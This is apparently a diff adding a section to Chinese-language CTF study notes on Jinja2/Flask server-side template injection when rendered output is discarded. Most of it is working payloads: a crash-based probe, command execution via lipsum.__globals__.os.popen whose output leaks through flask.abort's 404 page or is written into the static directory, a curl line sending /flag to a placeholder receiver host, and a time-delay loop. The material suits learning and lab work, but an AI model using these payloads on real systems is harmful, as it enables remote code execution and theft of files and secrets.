@@ -286,3 +286,114 @@ q('os')  ==  q.__self__['os']  ==  (那个字典)['os']
 换载体   → args / headers / cookies / form
 对沙箱   → 以上全部无效
 ```
+
+## 十五、无回显（输出被丢弃）时的四种输出通道
+
+上面十四节讲的都是「**过滤**」；这一节讲另一种情况：**没有过滤，模板也执行了，但渲染结果被业务代码丢掉**。
+
+典型源码（klf 靶机）：
+
+```python
+render_template_string(template % name)   # 执行了
+return render_template('klf.html')        # 但返回值没人要
+```
+
+### 15.1 先改判据：用「炸不炸」代替「看不看得见」
+
+```text
+{{ 1+1 }}  → 200   执行成功
+{{}}       → 500   语法错 → 被当模板解析了
+{{ 1/0 }}  → 500   运行时异常 → 真的执行了
+```
+
+**关键**：`{{7*7}}` 不出 49 **不能**推出「没注入」。单引用一个不存在的名字只会得到 Undefined（静默、200），**调用**它才会炸 —— 所以探针要写成调用的形式。
+
+```text
+{{ nosuch }}                         → 200（Undefined 渲染成空）
+{{ nosuch() }}                       → 500（调用 Undefined 报错）
+{{ lipsum.__globals__.os.popen('id').read() }}  → 200（链通、但结果被丢）
+```
+
+这个 200/500 探针在**还没有回显通道**时就能逐段验证链条断在哪。
+
+### 15.2 通道一：异常回显（最快，1 次请求）
+
+Werkzeug 的默认 404 页会把 `description` 原样写进 `<p>`：
+
+```jinja
+{{lipsum.__globals__.__builtins__.__import__('flask').abort(404, description='PING')}}
+```
+
+→ `<title>404 Not Found</title><h1>Not Found</h1><p>PING</p>`
+
+把数据塞进去：
+
+```jinja
+{{lipsum.__globals__.__builtins__.__import__('flask').abort(404, description=lipsum.__globals__.os.popen('id').read())}}
+```
+
+要点：
+
+| 点 | 说明 |
+|---|---|
+| `description` 必须是 **str** | `popen(...).read()` 是 str ✓；`os.system(...)` 是 **int** ✗（页面只会出现 `0`） |
+| `lipsum` 出现两次不是嵌套 | 两条并列链：一条到 `flask.abort`，一条到 `os.popen` |
+| 只写一次 | `{% set G = lipsum.__globals__ %}{{G.__builtins__.__import__('flask').abort(404, description=G.os.popen('id').read())}}` |
+| 状态码是 404 | 正常，flag 在正文里，别看到 404 就以为失败 |
+
+### 15.3 通道二：写进静态目录（最「基础」，2 次请求）
+
+`Flask(__name__)` 默认注册 `/static/<文件名>`，所以把结果写进 static 就能用浏览器读：
+
+```jinja
+{{lipsum.__globals__.os.popen('pwd > static/o.txt').read()}}
+```
+
+然后 `GET /static/o.txt`。
+
+**自举**：不知道绝对路径时先用相对路径（命令的 cwd 继承 Flask 进程）：
+
+```text
+popen('pwd > static/o.txt')            → 拿到 cwd
+popen('ls -laR /app > static/o.txt')   → 拿目录结构
+popen('cat /app/fl4gfl4gfl4g > static/leak.txt')  → 拿文件
+```
+
+写失败（404）说明 cwd 或 static 位置不对，换绝对路径再试。
+
+### 15.4 通道三：外带 OOB（要外网 + 接收端）
+
+```jinja
+{{lipsum.__globals__.__builtins__.__import__('flask').abort(404, description=lipsum.__globals__.os.popen('curl http://接收端/?=$(cat /flag)').read())}}
+```
+
+注意 `$(...)` 不能省，否则 `/flag` 会被当成第二个 URL 参数；query 里 `+` 等于空格。
+
+### 15.5 通道四：时间盲注（最兜底）
+
+```jinja
+{% for i in range(9000000) %}a{% endfor %}
+```
+
+实测 2.28 秒（基线 0.15 秒）。没有回显、不能写文件、不能出网时只剩这条。
+
+### 15.6 四条通道怎么选
+
+| 通道 | 请求数 | 前提 | 结果在哪 |
+|---|---|---|---|
+| 异常回显 | 1 | 能抛 HTTPException | 404 页面正文 |
+| 写 static | 2 | static 可写且被服务 | `/static/x.txt` |
+| 外带 OOB | 1 | 目标能出网 + 有接收端 | 接收端日志 |
+| 时间盲注 | 多 | 只要能执行 | 响应耗时 |
+
+判断顺序：**能抛异常就用异常**（最快）→ 不能就写文件 → 再不能才盲注。
+
+### 15.7 三个高频错误
+
+| 错误 | 现象 | 正确做法 |
+|---|---|---|
+| 把 `__import__` 当命令执行 | `__import__('ls -la')` → 500 `ModuleNotFoundError` | `__import__` 只导入模块；执行命令用 `os.popen('ls -la')` |
+| `.builtins` 少下划线 | 500，且 `'builtins' in globals` 为 False | `.__builtins__` |
+| 复制外来 WP 丢了 `__` | 链在 `.class` 就断 | Markdown 会把 `__class__` 渲染成加粗，复制前先看源码 |
+
+> 完整实战（含找 flag 过程与诱饵识别）→ [writeups/极客大挑战SYC/klf-ssti.md](../writeups/极客大挑战SYC/klf-ssti.md)
